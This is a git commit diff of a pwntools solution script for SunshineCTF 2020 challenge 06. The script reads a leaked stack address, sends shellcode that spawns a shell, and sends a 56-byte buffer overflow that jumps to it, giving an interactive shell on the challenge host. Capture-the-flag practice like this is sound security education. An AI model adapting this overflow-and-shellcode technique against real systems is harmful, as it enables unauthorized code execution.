f62a44cfa8284b4b621c9a118eec3c35fab9e81a
ajarmusch <61516473+ajarmusch@users.noreply.github.com>
2022-04-17 15:28:42 -0400

    Update 06.py

--- chall_06/06.py
+++ chall_06/06.py
@@ -1,16 +1,25 @@
 from pwn import *
 
-binary = context.binary = ELF('./chall_07')
+binary = context.binary = ELF('./chall_06')
 
 if not args.REMOTE:
     p = process(binary.path)
 else:
-    p = remote('chal.2020.sunshinectf.org', 30007)
+    p = remote('chal.2020.sunshinectf.org', 30006)
 
-p.sendline()
+p.recvuntil('Letting my armor fall again: ')
+_ = p.recvline().strip()
+stack = int(_,16)
+log.info('stack: ' + hex(stack))
 
 payload  = b''
 payload += asm(shellcraft.sh())
 
 p.sendline(payload)
+
+payload  = b''
+payload += 56 * b'A'
+payload += p64(stack)
+
+p.sendlineafter('For saving me from all they\'ve taken.\n',payload)
 p.interactive()
